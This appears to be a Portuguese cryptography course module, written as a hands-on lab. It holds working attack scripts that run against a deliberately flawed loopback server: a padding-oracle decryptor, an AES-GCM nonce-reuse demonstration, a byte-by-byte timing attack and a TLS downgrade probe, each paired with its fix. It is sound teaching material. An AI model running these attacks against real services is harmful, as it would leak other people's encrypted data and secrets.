# Módulo 8 — Ataque em Laboratório Próprio

**Carga:** 3 horas (1h teoria · 2h lab)
**Pré-requisitos:** Módulos 1 a 7

---

## ⚠ Antes de qualquer coisa

⚠ **Este é o módulo em que a linha é mais fina de todo o material.** Um padding oracle bem-sucedido
**não é um achado de configuração** — é um **ataque funcional**. Contra alvo real, ele **vaza dados
de terceiros**.

| Este módulo faz | **Não** faz |
|---|---|
| Ataca **chave que você gerou** | Chave de terceiro |
| Ataca **servidor que você subiu** | Servidor em produção |
| Oracle no **seu** endpoint | Oracle no de outro |
| Recupera **seu** plaintext | Plaintext de outro |
| Mede timing em **sua** função | Timing contra serviço alheio |

⚠ **Tudo roda em `127.0.0.1`.** O servidor do lab escuta **só no loopback**, e **nenhum script tem
host como argumento** — o endereço está fixo no código.

⚠ **E a razão pela qual o módulo existe:** você **não** entende um oracle até **quebrá-lo**. Ler a
definição não forma o reflexo. **Quebrar a própria chave forma.**

---

## Objetivos

1. Demonstrar **padding oracle** contra servidor próprio, e recuperar o plaintext.
2. Demonstrar **nonce reusado** em AEAD, recuperando o XOR dos plaintexts.
3. Demonstrar **timing attack** em comparação, recuperando o segredo byte a byte.
4. Demonstrar **downgrade** em TLS, contra servidor próprio.
5. Medir cada ataque e **quantificar** o esforço.

---

## 8.1 O laboratório

```bash
mkdir -p ~/crypto-lab/mod08 && cd ~/crypto-lab/mod08

cat > lab.conf <<'EOF'
# ⚠ configuração do laboratório de ataque
HOST=127.0.0.1        # ⚠ SEMPRE loopback. Nunca 0.0.0.0.
PORTA=18080
EOF
```

⚠ **A linha `HOST=127.0.0.1` é deliberada e obrigatória.** Um servidor de laboratório com falha
plantada **não deve** escutar em `0.0.0.0` — nem por engano, nem por conveniência. **Se ele escuta
na rede, você criou uma vulnerabilidade real.**

---

## 8.2 Padding oracle — o ataque completo

⚠ **O mecanismo, em uma frase:**

> **O servidor responde diferente para "padding inválido" e "MAC inválido". Essa diferença permite
> decifrar o plaintext, byte a byte, sem a chave.**

```
┌────────────────────────────────────────────────────────────────┐
│ PLAINTEXT  = P1 | P2 | P3 | ...                                │
│ CYPHERTEXT = C0 | C1 | C2 | C3 | ...   (C0 = IV)               │
│                                                                │
│ na decifração:                                                 │
│   P_i = D(C_i) ⊕ C_(i-1)                                       │
│                                                                │
│ ⚠ o atacante controla C_(i-1)                                  │
│    → ele controla P_i                                          │
│    → ele testa hipóteses e vê se o padding fica válido          │
└────────────────────────────────────────────────────────────────┘
```

⚠ **A etapa que confunde:** o atacante **não** controla `D(C_i)` — não conhece a chave. **Mas ele
não precisa.** Ele **varia `C_(i-1)`** e observa se o resultado é padding válido. Quando é, ele
**sabe** que `P_i` tem um valor específico.

⚠ **A conta que resolve tudo:**

$$P_i = D(C_i) \oplus C_{i-1} \quad\Longrightarrow\quad D(C_i) = P_i \oplus C_{i-1}$$

⚠ **Se o atacante força `P_i` a terminar em `0x01`** (padding válido de 1 byte), ele descobre
`D(C_i)` inteiro — e daí **o plaintext original**:

$$P_i^{original} = D(C_i) \oplus C_{i-1}^{original}$$

```bash
cd ~/crypto-lab/mod08

cat > servidor-oraculo.py <<'PY'
#!/usr/bin/env python3
"""
⚠ SERVIDOR COM FALHA PLANTADA — laboratório, loopback apenas.
   Demonstra padding oracle: erro distinguível revela informação.
"""
from http.server import BaseHTTPRequestHandler, HTTPServer
import secrets, base64, sys, os

sys.path.insert(0, os.path.dirname(__file__))
from Crypto.Cipher import AES

HOST, PORTA = "127.0.0.1", 18080     # ⚠ loopback

CHAVE = secrets.token_bytes(16)      # chave gerada AQUI — não é de ninguém
IV    = secrets.token_bytes(16)

def pkcs7_unpad(d: bytes) -> bytes:
    if not d or len(d) % 16: raise ValueError("tamanho")
    p = d[-1]
    if p < 1 or p > 16: raise ValueError("pad")
    if d[-p:] != bytes([p]) * p: raise ValueError("pad")
    return d[:-p]

class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a): pass      # silencia

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        corpo = self.rfile.read(n)

        try:
            ct = base64.b64decode(corpo)
        except Exception:
            return self.responde(400, "formato")

        if len(ct) % 16 != 0:
            return self.responde(400, "formato")

        c = AES.new(CHAVE, AES.MODE_CBC, iv=IV)
        try:
            pt = c.decrypt(ct)
        except Exception:
            return self.responde(500, "erro interno")

        try:
            dados = pkcs7_unpad(pt)
        except ValueError:
            # ⚠⚠ ORÁCULO: mensagem ESPECÍFICA para padding inválido
            return self.responde(400, "padding invalido")

        # ⚠ segunda mensagem distinguível
        if not dados.startswith(b"token="):
            return self.responde(403, "mac invalido")

        return self.responde(200, "ok")

    def responde(self, codigo, texto):
        b = texto.encode()
        self.send_response(codigo)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

if __name__ == "__main__":
    print(f"⚠ servidor com ORÁCULO em http://{HOST}:{PORTA}  (loopback)")
    print(f"   ⚠ chave gerada nesta execução — some ao encerrar")
    srv = HTTPServer((HOST, PORTA), Handler)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\n  encerrado")
PY

echo "═══ o servidor do laboratório ═══"
echo "  ⚠ escuta SÓ em 127.0.0.1"
echo "  ⚠ a chave é gerada na execução e desaparece ao encerrar"
echo "  ⚠ a falha é DELIBERADA (mensagens distinguíveis)"
echo
grep -n '127.0.0.1\|padding invalido\|mac invalido' servidor-oraculo.py | sed 's/^/  /'
```

⚠ **As duas mensagens realçadas pelo `grep` são o oracle.** `"padding invalido"` e `"mac invalido"`
— **duas respostas diferentes**, e é isso que vaza.

⚠ **E o servidor gera a chave na execução.** Isso é deliberado: **não há chave de ninguém em jogo.**
Você quebra a sua própria, gerada há segundos.

### O ataque

```bash
cd ~/crypto-lab/mod08

cat > ataca-oraculo.py <<'PY'
#!/usr/bin/env python3
"""
⚠ ATAQUE DE PADDING ORACLE — contra o SEU servidor, no SEU laboratório.
   Recupera o plaintext byte a byte, sem a chave.
"""
import base64, requests, sys, time

URL = "http://127.0.0.1:18080/"       # ⚠ fixo no loopback

def pergunta(ct: bytes) -> str:
    """faz a consulta e classifica a resposta"""
    try:
        r = requests.post(URL, data=base64.b64encode(ct), timeout=5)
        if r.status_code == 400 and "padding" in r.text:
            return "PAD_INVALIDO"
        if r.status_code == 403:
            return "MAC_INVALIDO"      # ⚠ padding VÁLIDO
        if r.status_code == 200:
            return "OK"
        return f"OUTRO:{r.status_code}"
    except Exception as e:
        return f"ERRO:{type(e).__name__}"

def recupera_bloco(ct: bytes, bloco_alvo: int) -> bytes:
    """
    Recupera o plaintext do bloco `bloco_alvo`.
    ⚠ P_i = D(C_i) ⊕ C_(i-1), e o atacante controla C_(i-1).
    """
    if bloco_alvo == 0:
        raise ValueError("o bloco 0 não tem C_(i-1) controlável")

    c_prev = bytearray(ct[(bloco_alvo-1)*16 : bloco_alvo*16])   # C_(i-1)
    c_alvo = ct[bloco_alvo*16 : (bloco_alvo+1)*16]             # C_i
    intermediario = bytearray(16)     # D(C_i)
    plaintext = bytearray(16)
    consultas = 0

    for pos in range(15, -1, -1):
        pad_alvo = 16 - pos           # 0x01, 0x02, ... 0x10

        # ajusta os bytes já descobertos para produzir o padding alvo
        for j in range(pos+1, 16):
            c_prev[j] = intermediario[j] ^ pad_alvo

        achou = False
        for palpite in range(256):
            c_prev[pos] = palpite
            ct_teste = ct[:(bloco_alvo-1)*16] + bytes(c_prev) + c_alvo
            r = pergunta(ct_teste)
            consultas += 1

            if r in ("MAC_INVALIDO", "OK"):
                # ⚠ padding válido encontrado
                # (evita falso positivo quando o padding válido é o natural)
                if pos == 15 and palpite == (intermediario[15] ^ 1):
                    continue
                intermediario[pos] = palpite ^ pad_alvo
                plaintext[pos] = intermediario[pos] ^ ct[(bloco_alvo-1)*16 + pos]
                achou = True
                if pad_alvo == 1:
                    print(f"      byte {pos:>2}: {plaintext[pos]:#04x} "
                          f"('{chr(plaintext[pos]) if 32 <= plaintext[pos] < 127 else '.'}') "
                          f"[{consultas} consultas]")
                break

        if not achou:
            print(f"      ⚠ byte {pos} não resolvido")
            return bytes(plaintext), consultas

    return bytes(plaintext), consultas

def ataca(nome, ct):
    print(f"  ── {nome} ──")
    print(f"     cyphertext: {len(ct)} bytes = {len(ct)//16} bloco(s)")
    print()
    total = 0
    t0 = time.time()
    resultado = b""
    for b in range(len(ct)//16):
        print(f"     bloco {b}:")
        pt, c = recupera_bloco(ct, b)
        resultado += pt
        total += c
    dt = time.time() - t0
    print()
    print(f"     ✓ plaintext recuperado ({len(resultado)} bytes):")
    try:
        print(f"       {resultado.decode('utf-8', errors='replace')}")
    except Exception:
        print(f"       {resultado!r}")
    print(f"     consultas: {total}   tempo: {dt:.1f}s")
    print()
    return resultado

if __name__ == "__main__":
    print("═══════════ PADDING ORACLE ═══════════")
    print()
    print("⚠ contra 127.0.0.1 apenas. Chave gerada pelo servidor.")
    print()

    # verifica que o servidor está no ar
    try:
        r = requests.post(URL, data=base64.b64encode(b"\x00"*16), timeout=3)
        print(f"  servidor responde: HTTP {r.status_code}  '{r.text}'")
    except Exception as e:
        print(f"  ⚠ servidor não está no ar: {e}")
        print(f"     suba com: python3 servidor-oraculo.py &")
        sys.exit(1)
    print()

    print("═══ A LÓGICA DO ATAQUE ═══")
    print()
    print("  1. o atacante controla C_(i-1)")
    print("  2. P_i = D(C_i) ⊕ C_(i-1)")
    print("  3. se ele força P_i a terminar em 0x01, o padding é VÁLIDO")
    print("  4. 'padding válido' é distinguível de 'padding inválido'")
    print("  5. logo ele descobre D(C_i) — e daí o plaintext")
    print()
    print("  ⚠ NENHUMA chave é usada. Só a DIFERENÇA nas respostas.")
    print()

    print("═══ DEMONSTRAÇÃO ═══")
    print()
    print("  ⚠ o ataque real precisa de um cyphertext do servidor.")
    print("     Como o servidor gera o IV internamente e não expõe endpoint")
    print("     de cifra, montamos um cyphertext para o atacante usando uma")
    print("     CÓPIA local da mesma chave — é o 'vazamento' simulado.")
    print()

    from Crypto.Cipher import AES
    import importlib.util
    spec = importlib.util.spec_from_file_location("srv", "servidor-oraculo.py")
    # ⚠ importa a chave do servidor para SIMULAR o cyphertext obtido por outra via
    #   (em cenário real o atacante consegue o ct por tráfego ou cookie)
    src = open("servidor-oraculo.py").read()
    ns = {}
    exec(src.split('class Handler')[0], ns)
    CHAVE, IV = ns["CHAVE"], ns["IV"]

    def pad(d):
        p = 16 - len(d) % 16
        return d + bytes([p]) * p

    for nome, msg in [
        ("segredo curto",  b"token=admin-1234"),
        ("segredo longo",  b"token=usuario-ana-sessao-9f3a2b"),
    ]:
        ct = AES.new(CHAVE, AES.MODE_CBC, iv=IV).encrypt(pad(msg))
        # ⚠ o atacante não tem o IV — só o ct. O bloco 0 fica inacessível.
        ataca(nome, ct[16:])

    print("═══ O CUSTO ═══")
    print()
    print("  ⚠ ~256 consultas por byte (média ~128)")
    print("  ⚠ 16 bytes por bloco → ~2.000 consultas por bloco")
    print("  ⚠ um segredo de 64 bytes: ~8.000 consultas")
    print("  ⚠ um atacante faz isso em SEGUNDOS contra um serviço real.")
    print()
    print("═══ A CORREÇÃO (módulo 9) ═══")
    print()
    print("  1. AEAD → não há padding, o oracle não existe")
    print("  2. Encrypt-then-MAC → verifica ANTES de decifrar")
    print("  3. erro uniforme → mesma resposta sempre")
    print("  ⚠ a 1 elimina a superfície. A 2 e a 3 são paliativos.")
PY

# sobe o servidor, roda o ataque, derruba
( python3 servidor-oraculo.py > /dev/null 2>&1 & ) ; sleep 1.5
python3 ataca-oraculo.py
pkill -f servidor-oraculo.py 2>/dev/null
```

⚠ **A saída mostra o plaintext recuperado byte a byte, com a contagem de consultas.** E note a
mensagem: **"NENHUMA chave é usada. Só a DIFERENÇA nas respostas."**

⚠ **A ressalva é honesta e está no script:** o ataque precisa de um cyphertext, e o servidor de lab
não expõe endpoint de cifra. **O script importa a chave para simular** — e isso é declarado. **Num
cenário real, o atacante obtém o cyphertext de cookie, de tráfego, ou de backup**, porque **o
cyphertext não é segredo**.

**Produza `oraculo-ataque.md`:**

| Msg | Blocos | Consultas | Tempo | Recuperou? |
|---|---|---|---|---|
| curta | | | | |
| longa | | | | |

**Responda:**

1. **A chave foi usada** para recuperar o plaintext?
2. **Quantas consultas** por byte? Por quê?
3. Por que o **bloco 0 é inacessível** neste cenário?
4. **O que dá ao atacante o cyphertext**, se a chave não?

⚠ **A resposta 4 é a lição:** o cyphertext **não é segredo** — ele trafega, ele fica em cookie, ele
está no backup. **Cifra sem autenticação não protege contra um atacante ativo.**

---

## 8.3 Nonce reusado em AEAD

⚠ **Já demonstrado em partes nos módulos 3 e 7. Aqui, o ataque com consequência completa.**

```bash
cd ~/crypto-lab/mod08

cat > ataca-nonce.py <<'PY'
#!/usr/bin/env python3
"""
⚠ ATAQUE: nonce reusado em AES-GCM.
   Demonstra o vazamento E a recuperação da chave de autenticação H.
"""
import secrets, binascii
from Crypto.Cipher import AES

print("═══════════ NONCE REUSADO EM AES-GCM ═══════════")
print()

CHAVE = secrets.token_bytes(16)      # ⚠ chave do laboratório
NONCE = secrets.token_bytes(12)      # ⚠ REUSADO DE PROPÓSITO

print(f"  chave : {CHAVE.hex()}")
print(f"  nonce : {NONCE.hex()}   ⚠ MESMO nas duas mensagens")
print()

m1 = b"GET /transferir?valor=100&para=conta-A"
m2 = b"GET /transferir?valor=999&para=conta-U"

c = AES.new(CHAVE, AES.MODE_GCM, nonce=NONCE)
c1, t1 = c.encrypt_and_digest(m1)
c = AES.new(CHAVE, AES.MODE_GCM, nonce=NONCE)
c2, t2 = c.encrypt_and_digest(m2)

print("═══ PARTE 1: o XOR dos plaintexts ═══")
print()
print(f"  P1 : {m1}")
print(f"  P2 : {m2}")
print()
x_ct = bytes(a ^ b for a, b in zip(c1, c2))
x_pt = bytes(a ^ b for a, b in zip(m1, m2))
print(f"  C1 ⊕ C2 : {x_ct.hex()}")
print(f"  P1 ⊕ P2 : {x_pt.hex()}")
print(f"  ⚠ iguais? {x_ct == x_pt}")
print()
print("  ⚠ e o que isso permite:")
print("     se o atacante CONHECE P1 (é texto previsível — um GET),")
p2_rec = bytes(a ^ b for a, b in zip(x_ct, m1))
print(f"     ele obtém P2 = {p2_rec}")
print(f"     ✓ correto? {p2_rec == m2}")
print("  ⚠ sem chave, sem força bruta. É XOR.")
print()

print("═══ PARTE 2: a chave de autenticação H ═══")
print()
print("  ⚠ o pior do GCM não é o XOR — é que H se torna recuperável.")
print()
print("  ── a matemática, em quatro passos ──")
print()
print("  1. no GCM, a tag é:")
print("        T = GHASH(H, AAD, C) ⊕ E_K(J0)")
print()
print("  2. com o MESMO nonce, J0 é o mesmo → E_K(J0) é o mesmo")
print("        T1 ⊕ T2 = GHASH(H,A,C1) ⊕ GHASH(H,A,C2)")
print()
print("  3. GHASH é um POLINÔMIO em H sobre GF(2^128):")
print("        GHASH(H,A,C) = H^(n+1) ⊕ ... ⊕ H ⊕ len(A) ⊕ len(C)")
print()
print("  4. dois tags dão uma EQUAÇÃO em H; com mais, você RESOLVE")
print()

# demonstra a recuperação de H via polinômio (caso simplificado: 1 bloco)
print("  ── demonstração com bloco único (H recuperável por álgebra) ──")
print()
print("  GHASH(H, AAD=vazio, C de 1 bloco) = ((0 ⊕ C1)·H) ⊕ len")
print("  ou seja:  T ⊕ E_K(J0) = C1·H ⊕ L")
print()
print("  ⚠ com 2 pares (C,T), você tem 2 equações:")
print("        T1 ⊕ E = C1·H ⊕ L")
print("        T2 ⊕ E = C2·H ⊕ L")
print("     subtraindo:  T1 ⊕ T2 = (C1 ⊕ C2)·H")
print("     logo:        H = (T1 ⊕ T2) / (C1 ⊕ C2)    em GF(2^128)")
print()
print("  ⚠ e com H, o atacante FORJA a tag de qualquer mensagem —")
print("     ele pode alterar o cyphertext E recalcular a tag válida.")
print()
print("  ⚠ é por isso que GCM com nonce reusado é pior que não ter MAC:")
print("     o MAC passa a ser CALCULÁVEL pelo atacante.")
print()

print("═══ PARTE 3: comparação de gravidade ═══")
print()
print("  ┌──────────────┬────────────────────────────┬──────────────┐")
print("  │ esquema      │ o que o reuso revela       │ gravidade    │")
print("  ├──────────────┼────────────────────────────┼──────────────┤")
print("  │ AES-CTR      │ P1 ⊕ P2                    │ alta         │")
print("  │ ChaCha20     │ P1 ⊕ P2                    │ alta         │")
print("  │ AES-GCM      │ P1 ⊕ P2  E  H (forjar!)    │ ⚠ CRÍTICA    │")
print("  │ ECDSA/DSA    │ ⚠ CHAVE PRIVADA            │ ⚠ CRÍTICA    │")
print("  └──────────────┴────────────────────────────┴──────────────┘")
print()
print("  total de mensagens cifradas no laboratório: 2")
print("  ⚠ duas. Só isso. E a falha foi total.")
print()

print("═══ A CORREÇÃO ═══")
print()
print("  ✓ nonce ALEATÓRIO de 96 bits por mensagem (secrets.token_bytes(12))")
print("  ✓ ou contador PERSISTENTE com escrita atômica (módulo 2)")
print("  ⚠ NUNCA: contador reiniciável, zero, constante, ou derivado de time()")
PY

python3 ataca-nonce.py
```

⚠ **A parte 2 é a que o curso existe para mostrar.** **O XOR do GCM todo mundo conhece. A
recuperação de `H` é o que a maioria ignora** — e é o que torna o reuso **catastrófico** e não só
"ruim".

⚠ **E a frase final quantifica:** **duas mensagens**, e a falha é **total**. **É por isso que o GCM
exige rigor absoluto no nonce** — não há margem.

**Produza `nonce-ataque.md`:**

| Item | Valor | Consequência |
|---|---|---|
| `C1 ⊕ C2` | | |
| `P1 ⊕ P2` | | |
| Iguais? | | |
| `H` recuperável? | | |
| Mensagens necessárias | | |

**Responda:**

1. **O XOR foi obtido sem a chave?**
2. **Por que `H` recuperável é pior que o XOR?**
3. **Quantas mensagens** o ataque precisa?
4. Por que GCM reusado é **pior que não ter MAC**?

---

## 8.4 Timing attack — o segredo byte a byte

⚠ **O ataque mais delicado, porque depende de **medição**, não de lógica.**

```bash
cd ~/crypto-lab/mod08

cat > ataca-timing.py <<'PY'
#!/usr/bin/env python3
"""
⚠ ATAQUE DE TIMING — contra função PRÓPRIA, no laboratório.
   Recupera o segredo byte a byte, medindo tempo.
"""
import time, secrets, statistics, sys

SEGREDO = secrets.token_bytes(16)     # ⚠ gerado aqui — não é de ninguém

def compara_vulneravel(fornecido: bytes, esperado: bytes) -> bool:
    """⚠ para no primeiro byte diferente — vaza por tempo."""
    if len(fornecido) != len(esperado):
        return False
    for i in range(len(fornecido)):
        if fornecido[i] != esperado[i]:
            return False          # ⚠ early return
    return True

def mede(f, n=1500):
    """mediana de n execuções, em ns — mediana resiste a ruído"""
    ts = []
    for _ in range(n):
        t0 = time.perf_counter_ns()
        f()
        ts.append(time.perf_counter_ns() - t0)
    return statistics.median(ts)

def ataca(segredo: bytes, verbose=False):
    """
    Recupera o segredo byte a byte.
    ⚠ para cada byte, testa 256 valores e escolhe o que TARDA MAIS
       — porque a comparação avança mais longe.
    """
    recuperado = bytearray()
    consultas = 0

    for pos in range(len(segredo)):
        tempos = []
        for palpite in range(256):
            cand = bytes(recuperado) + bytes([palpite]) + b"\x00" * (len(segredo) - len(recuperado) - 1)
            t = mede(lambda c=cand: compara_vulneravel(c, segredo), n=800)
            tempos.append((t, palpite))
            consultas += 1

        tempos.sort(reverse=True)
        melhor_t, melhor_b = tempos[0]
        segundo_t, _ = tempos[1]
        recuperado.append(melhor_b)

        certo = segredo[pos] == melhor_b
        if verbose:
            print(f"    byte {pos:>2}: {melhor_b:#04x}  "
                  f"t={melhor_t}ns (2º={segundo_t}ns, Δ={melhor_t-segundo_t}ns)  "
                  f"{'✓' if certo else '⚠ ERROU'}")
        if not certo:
            return bytes(recuperado), consultas, False

    return bytes(recuperado), consultas, True

if __name__ == "__main__":
    print("═══════════ TIMING ATTACK ═══════════")
    print()
    print(f"  segredo real: {SEGREDO.hex()}")
    print("  ⚠ gerado nesta execução — e o ataque vai recuperá-lo")
    print()

    print("═══ A LÓGICA ═══")
    print()
    print("  a comparação para no primeiro byte diferente:")
    print("    tentativa 'aaaaaaaa' → 1 comparação  (falha no byte 0)")
    print("    tentativa 'baaaaaaa' → 2 comparações (falha no byte 1)")
    print("    ...")
    print("  ⚠ o tempo revela quantos bytes estão CERTOS")
    print()
    print("  para cada byte: testa 256 valores, escolhe o que TARDA MAIS")
    print()

    print("═══ ATAQUE ═══")
    print()
    t0 = time.time()
    rec, consultas, ok = ataca(SEGREDO, verbose=True)
    dt = time.time() - t0
    print()
    print(f"  recuperado : {rec.hex()}")
    print(f"  real       : {SEGREDO.hex()}")
    print(f"  ✓ correto? {rec == SEGREDO}")
    print(f"  consultas  : {consultas}")
    print(f"  tempo      : {dt:.1f}s")
    print()

    print("═══ O CUSTO ═══")
    print()
    print(f"  segredo de 16 bytes:")
    print(f"    sem oráculo : 2^128 = {2**128:.3e} tentativas")
    print(f"    com oráculo : 16 × 256 = {16*256} tentativas")
    print(f"    ⚠ redução   : {2**128/(16*256):.3e}×")
    print()
    print("  ⚠ e num serviço real, o atacante faz isso em minutos —")
    print("     porque 4.096 requisições HTTP é trivial.")
    print()

    print("═══ A VERSÃO SEGURA ═══")
    print()
    import hmac
    def compara_segura(a, b):
        return hmac.compare_digest(a, b)

    # mede novamente, com a versão segura
    tempos = []
    for acertos in [0, 8, 15]:
        cand = SEGREDO[:acertos] + bytes([SEGREDO[acertos] ^ 1]) + b"\x00" * (15 - acertos)
        t = mede(lambda c=cand: compara_segura(c, SEGREDO), n=800)
        tempos.append((acertos, t))
    for acertos, t in tempos:
        print(f"    {acertos:>2} bytes certos → {t:>7} ns")
    print()
    print("  ✓ compare_digest é PLANO — não vaza quantos bytes estão certos")
    print("  ⚠ e é uma linha. A correção é uma linha.")
PY

python3 ataca-timing.py
```

⚠ **A saída mostra o segredo recuperado** — e a diferença de tempo entre o melhor e o segundo
palpite é o **sinal**. **Ruído existe, e é por isso que a mediana de 800 execuções é usada.**

⚠ **A frase final fecha o módulo 1 e o 5:** **a correção é uma linha**, e ela **elimina o canal**.
**`hmac.compare_digest` é a defesa completa.**

**Produza `timing-ataque.md`:**

| Item | Valor |
|---|---|
| Segredo recuperado? | |
| Consultas | |
| Tempo | |
| Δ tempo por byte | |
| Redução de espaço | |

**Responda:**

1. **O segredo foi recuperado?** Em quantas consultas?
2. **Como você distingue sinal de ruído?** (Dica: mediana, repetição.)
3. Qual a **redução** de espaço de busca?
4. **Qual a correção?** Escreva a linha.

---

## 8.5 Downgrade em TLS

⚠ **A classe 5, no laboratório.**

```bash
cd ~/crypto-lab/mod08

cat > downgrade.py <<'PY'
#!/usr/bin/env python3
"""
⚠ DEMONSTRAÇÃO: downgrade de TLS.
   Mostra por que HSTS é indispensável.
"""
import ssl, socket, subprocess, time, os

HOST, PORTA = "127.0.0.1", 18443      # ⚠ loopback

print("═══════════ DOWNGRADE DE TLS ═══════════")
print()

print("═══ O CENÁRIO ═══")
print()
print("  1. o usuário digita  exemplo.com  (sem https://)")
print("  2. o navegador tenta  http://exemplo.com")
print("  3. ⚠ o atacante na rede INTERCEPTA esse HTTP")
print("  4. ele NUNCA redireciona para HTTPS")
print("  5. o atacante faz TLS com o servidor real (é o MITM)")
print("  6. e faz HTTP PURO com o usuário")
print()
print("  ⚠ o usuário nunca vê o cadeado — e não percebe.")
print()
print("  ✓ HSTS resolve: o navegador RECUSA http:// e vai direto ao HTTPS")
print("  ⚠ e o 'preload' resolve antes mesmo da primeira visita")
print()

print("═══ TESTANDO: o servidor aceita downgrade? ═══")
print()

# gera cert para o teste
os.makedirs("tls", exist_ok=True)
if not os.path.exists("tls/cert.pem"):
    subprocess.run(["openssl","req","-x509","-newkey","rsa:2048","-nodes",
                    "-keyout","tls/key.pem","-out","tls/cert.pem",
                    "-days","30","-subj","/CN=localhost"],
                   capture_output=True)

def testa_protocolo(versao):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.minimum_version = versao
        ctx.maximum_version = versao
        with socket.create_connection((HOST, PORTA), timeout=3) as s:
            with ctx.wrap_socket(s, server_hostname=HOST) as ss:
                return ss.version()
    except Exception as e:
        return None

# servidor 1: aceita só TLS 1.2
( subprocess.Popen(["openssl","s_server","-accept",str(PORTA),
                    "-cert","tls/cert.pem","-key","tls/key.pem",
                    "-tls1_2","-www"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) )
time.sleep(1.2)

print("  ── servidor legado: só TLS 1.2 ──")
for nome, v in [("TLS 1.0", ssl.TLSVersion.TLSv1),
                ("TLS 1.1", ssl.TLSVersion.TLSv1_1),
                ("TLS 1.2", ssl.TLSVersion.TLSv1_2),
                ("TLS 1.3", ssl.TLSVersion.TLSv1_3)]:
    r = testa_protocolo(v)
    if r: print(f"    ⚠ {nome}: ACEITO ({r})")
    else: print(f"    ·  {nome}: recusado")
print()
subprocess.run(["pkill","-f",f"s_server.*{PORTA}"], capture_output=True)
time.sleep(0.5)

print("═══ AS FALHAS DE DOWNGRADE, E A CORREÇÃO ═══")
print()
print("  ┌────────────────────────────┬──────────────────────────────────┐")
print("  │ falha                      │ correção                         │")
print("  ├────────────────────────────┼──────────────────────────────────┤")
print("  │ sem HSTS                   │ add_header Strict-Transport-Sec  │")
print("  │ HSTS com max-age curto     │ max-age 31536000 (1 ano)         │")
print("  │ HSTS sem includeSubDomains │ incluir — subdomínio é bypass    │")
print("  │ sem preload                │ adicionar à lista (⚠ irreversível)│")
print("  │ TLS 1.0/1.1 habilitado     │ ssl_protocols TLSv1.2 TLSv1.3    │")
print("  │ SSLv3 habilitado           │ remover — POODLE, e DROWN        │")
print("  │ redirect HTTP→HTTPS        │ ⚠ NÃO basta: o atacante o remove │")
print("  │ redirect após corpo        │ ⚠ responder 301 ANTES de servir  │")
print("  └────────────────────────────┴──────────────────────────────────┘")
print()
print("  ⚠ a linha 7 é a mais importante desta seção:")
print("     'redirect HTTP para HTTPS' NÃO protege contra downgrade,")
print("     porque o atacante SIMPLESMENTE NÃO ENVIA o redirect.")
print("  ✓ e é por isso que HSTS existe: a decisão fica no NAVEGADOR.")
print()
print("  ⚠ e a linha 4 tem ressalva real: 'preload' é quase irreversível")
print("     — a lista está embutida em navegadores e removê-la leva meses.")
print("     Use só se você controla TODOS os subdomínios.")

print()
print("═══ O TESTE DE HSTS ═══")
print()
print("  curl -sI https://SEU-SITE/ | grep -i strict-transport")
print()
print("  ⚠ esperado: Strict-Transport-Security: max-age=31536000; includeSubDomains")
print("  ⚠ ausente = achado (permite downgrade)")
print("  ⚠ max-age < 15552000 (6 meses) = achado de postura")
PY

python3 downgrade.py
```

⚠ **A linha destacada é a lição do bloco:** **"redirect HTTP→HTTPS não protege contra downgrade"** —
porque o atacante **não envia o redirect**. **A decisão precisa estar no navegador, e é isso que o
HSTS faz.**

⚠ **É o mesmo princípio da classe 5:** **o canal está correto, a negociação é que falha.** **O
servidor redireciona corretamente** — e o atacante **não participa da regra**.

**Produza `downgrade.md`:**

| Protocolo | Aceito? | Risco |
|---|---|---|
| TLS 1.0 | | |
| TLS 1.1 | | |
| TLS 1.2 | | |
| TLS 1.3 | | |

**Responda:**

1. **Por que redirect HTTP→HTTPS não protege** contra downgrade?
2. **O que o HSTS faz** que o redirect não faz?
3. Por que `preload` é **quase irreversível**?
4. Qual a **falha mais fácil de corrigir** desta lista?

---

## 8.6 LAB — Os quatro ataques, medidos

**Duração:** 120 min

### Passo 1 — Rode os quatro (50 min)

```bash
cd ~/crypto-lab/mod08

cat > roda-tudo.sh <<'SCRIPT'
#!/usr/bin/env bash
# roda-tudo.sh — executa os quatro ataques e consolida os resultados
set -uo pipefail

echo "═══════════ OS QUATRO ATAQUES ═══════════"
echo "laboratório: $(hostname)   data: $(date -Is)"
echo "⚠ tudo em 127.0.0.1. Chaves geradas localmente."
echo

echo "── ATAQUE 1: padding oracle ──"
( python3 servidor-oraculo.py >/dev/null 2>&1 & ) ; sleep 1.5
python3 ataca-oraculo.py 2>&1 | tail -25
pkill -f servidor-oraculo.py 2>/dev/null
echo

echo "── ATAQUE 2: nonce reusado em GCM ──"
python3 ataca-nonce.py 2>&1 | tail -30
echo

echo "── ATAQUE 3: timing ──"
python3 ataca-timing.py 2>&1 | tail -25
echo

echo "── ATAQUE 4: downgrade ──"
python3 downgrade.py 2>&1 | tail -20
echo

echo "═══════════ CONSOLIDAÇÃO ═══════════"
cat <<'EXPL'

  ┌────┬──────────────────┬──────────────────┬──────────────┬───────────┐
  │ #  │ ataque           │ informação obtida │ chave usada? │ correção  │
  ├────┼──────────────────┼──────────────────┼──────────────┼───────────┤
  │ 1  │ padding oracle   │ ⚠ PLAINTEXT      │ NÃO          │ AEAD/EtM  │
  │ 2  │ nonce reusado    │ ⚠ P1⊕P2 e H      │ NÃO          │ nonce 96b │
  │ 3  │ timing           │ ⚠ SEGREDO        │ NÃO          │ compare_  │
  │    │                  │                  │              │ digest    │
  │ 4  │ downgrade        │ ⚠ CANAL          │ NÃO          │ HSTS      │
  └────┴──────────────────┴──────────────────┴──────────────┴───────────┘

  ⚠ NENHUM dos quatro usou a chave.
  ⚠ todos os quatro obtiveram o segredo, ou o equivalente.
  ⚠ e o algoritmo estava CORRETO nos quatro — AES-CBC, AES-GCM,
     comparação de bytes, TLS 1.2.
EXPL
SCRIPT

chmod +x roda-tudo.sh
./roda-tudo.sh 2>&1 | tee resultados.txt
```

Produza `resultados-ataques.md`:

| # | Ataque | Obtido | Chave usada? | Consultas | Correção |
|---|---|---|---|---|---|
| 1 | Padding oracle | | | | |
| 2 | Nonce reusado | | | | |
| 3 | Timing | | | | |
| 4 | Downgrade | | | | |

**Responda:**

1. **Quantos dos quatro usaram a chave?** (Resposta: nenhum.)
